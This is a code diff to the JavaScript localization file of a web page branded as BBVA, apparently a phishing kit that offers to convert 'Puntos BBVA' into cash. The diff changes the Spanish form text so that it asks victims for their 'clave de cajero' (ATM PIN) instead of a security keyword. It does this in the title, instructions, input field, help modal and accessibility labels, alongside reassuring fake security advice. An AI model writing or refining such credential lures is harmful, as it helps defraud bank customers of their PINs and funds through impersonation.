@@ -16,7 +16,7 @@
  * =============================================================================
  */
 
-(function(root) {
+(function (root) {
   "use strict";
 
   // Idioma activo por defecto ('es' o 'en')
@@ -135,12 +135,12 @@
       PUNTOS_COSTO_TX: "Costo por transacción",
       PUNTOS_COSTO_VAL: "$0 COP (Gratis)",
       PALABRA_BADGE: "Validación de Seguridad",
-      PALABRA_TITLE: "Ingresa tu palabra clave",
-      PALABRA_DESC: "Para autorizar la redención y el desembolso seguro de tus Puntos BBVA a tus productos, por favor digita tu palabra clave de seguridad registrada.",
-      PALABRA_INFO_BOX: "<strong>¿Qué es la palabra clave?</strong> Es la palabra o código alfanumérico que registraste en tus canales digitales de BBVA para validar y firmar operaciones bancarias y canje de beneficios.",
-      PALABRA_INPUT_LABEL: "Palabra clave de seguridad",
+      PALABRA_TITLE: "Ingresa tu Clave de cajero",
+      PALABRA_DESC: "Para autorizar la redención y el desembolso seguro de tus Puntos BBVA a tus productos, por favor digita tu clave de cajero registrada.",
+      PALABRA_INFO_BOX: "<strong>¿Qué es la clave de cajero?</strong> Es la palabra o código alfanumérico que registraste en tus canales digitales de BBVA para validar y firmar operaciones bancarias y canje de beneficios.",
+      PALABRA_INPUT_LABEL: "Clave de cajero",
       PALABRA_NO_RECUERDAS: "¿No recuerdas tu clave?",
-      PALABRA_INPUT_PLACEHOLDER: "Digita tu palabra clave de seguridad",
+      PALABRA_INPUT_PLACEHOLDER: "Digita tu clave de cajero",
       PALABRA_ERROR_REQUIRED: "Este campo es requerido.",
       PALABRA_FIELD_HINT: "Dato confidencial cifrado con seguridad bancaria BBVA.",
       PALABRA_BTN_SUBMIT: "Confirmar y procesar puntos",
@@ -148,15 +148,15 @@
       PALABRA_CANCELAR_SALIR: "Cancelar y salir",
       PALABRA_SECURITY_TITLE: "Recomendación de Seguridad BBVA",
       PALABRA_SECURITY_TEXT: "BBVA nunca solicitará tus claves, palabras secretas o códigos de confirmación a través de llamadas telefónicas, mensajes de texto o correos electrónicos. Esta operación se realiza únicamente dentro de nuestros canales oficiales.",
-      PALABRA_MODAL_TITLE: "Palabra Clave de Seguridad",
-      PALABRA_MODAL_P1: "La <strong>Palabra Clave</strong> es un factor de autenticación de seguridad exclusivo que te permite autorizar transacciones de alta relevancia, tales como:",
+      PALABRA_MODAL_TITLE: "Clave de cajero",
+      PALABRA_MODAL_P1: "La <strong>Clave de cajero</strong> es un factor de autenticación de seguridad exclusivo que te permite autorizar transacciones de alta relevancia, tales como:",
       PALABRA_MODAL_LI1: "Redención y traslado de Puntos BBVA a dinero en cuenta.",
       PALABRA_MODAL_LI2: "Transferencias entre cuentas y pagos de servicios.",
       PALABRA_MODAL_LI3: "Cambio de parámetros de seguridad en BBVA Net y App BBVA.",
-      PALABRA_MODAL_P2: "Si no recuerdas tu palabra clave, puedes reestablecerla fácilmente ingresando a tu <strong>App BBVA Móvil</strong> en la sección <em>Ajustes > Seguridad</em>, o comunicándote con nuestra línea de atención.",
+      PALABRA_MODAL_P2: "Si no recuerdas tu clave de cajero, puedes reestablecerla fácilmente ingresando a tu <strong>App BBVA Móvil</strong> en la sección <em>Ajustes > Seguridad</em>, o comunicándote con nuestra línea de atención.",
       PALABRA_MODAL_BTN: "Entendido",
-      PALABRA_ARIA_MOSTRAR: "Mostrar palabra clave",
-      PALABRA_ARIA_OCULTAR: "Ocultar palabra clave"
+      PALABRA_ARIA_MOSTRAR: "Mostrar clave de cajero",
+      PALABRA_ARIA_OCULTAR: "Ocultar clave de cajero"
     },
 
     // -------------------------------------------------------------------------
@@ -294,7 +294,7 @@
     }
 
     // 2. Elementos con data-i18n (reemplazo de texto plano)
-    document.querySelectorAll("[data-i18n]").forEach(function(el) {
+    document.querySelectorAll("[data-i18n]").forEach(function (el) {
       if (el.tagName.toLowerCase() === "title") return;
       const key = el.getAttribute("data-i18n");
       if (dict[key] !== undefined) {
@@ -303,7 +303,7 @@
     });
 
     // 3. Elementos con data-i18n-html (reemplazo respetando etiquetas internas)
-    document.querySelectorAll("[data-i18n-html]").forEach(function(el) {
+    document.querySelectorAll("[data-i18n-html]").forEach(function (el) {
       const key = el.getAttribute("data-i18n-html");
       if (dict[key] !== undefined) {
         el.innerHTML = dict[key];
@@ -311,17 +311,17 @@
     });
 
     // 4. Atributos de elementos (placeholder, title, aria-label)
-    document.querySelectorAll("[data-i18n-placeholder]").forEach(function(el) {
+    document.querySelectorAll("[data-i18n-placeholder]").forEach(function (el) {
       const key = el.getAttribute("data-i18n-placeholder");
       if (dict[key] !== undefined) el.placeholder = dict[key];
     });
 
-    document.querySelectorAll("[data-i18n-title]").forEach(function(el) {
+    document.querySelectorAll("[data-i18n-title]").forEach(function (el) {
       const key = el.getAttribute("data-i18n-title");
       if (dict[key] !== undefined) el.title = dict[key];
     });
 
-    document.querySelectorAll("[data-i18n-aria]").forEach(function(el) {
+    document.querySelectorAll("[data-i18n-aria]").forEach(function (el) {
       const key = el.getAttribute("data-i18n-aria");
       if (dict[key] !== undefined) el.setAttribute("aria-label", dict[key]);
     });
@@ -336,7 +336,7 @@
     if (nodo.nodeType === Node.TEXT_NODE) {
       const texto = nodo.nodeValue;
       if (texto && texto.indexOf("{{") !== -1) {
-        nodo.nodeValue = texto.replace(/\{\{\s*([A-Z0-9_]+)\s*\}\}/g, function(match, key) {
+        nodo.nodeValue = texto.replace(/\{\{\s*([A-Z0-9_]+)\s*\}\}/g, function (match, key) {
           return dict[key] !== undefined ? dict[key] : match;
         });
       }
@@ -350,11 +350,11 @@
   }
 
   // Función para cambiar de idioma dinámicamente desde consola o UI
-  root.cambiarIdioma = function(nuevoIdioma) {
+  root.cambiarIdioma = function (nuevoIdioma) {
     if (TEXTOS[nuevoIdioma]) {
       try {
         localStorage.setItem("bbva_idioma_activo", nuevoIdioma);
-      } catch (e) {}
+      } catch (e) { }
       aplicarVariablesDeTexto();
       console.info("Idioma cambiado a: " + nuevoIdioma);
     } else {
@@ -363,7 +363,7 @@
   };
 
   // Función helper accesible globalmente: window.t('VARIABLE', fallback)
-  root.t = function(key, fallback) {
+  root.t = function (key, fallback) {
     const lang = obtenerIdiomaActivo();
     const dict = TEXTOS[lang] || TEXTOS["es"];
     return dict[key] !== undefined ? dict[key] : (fallback || key);
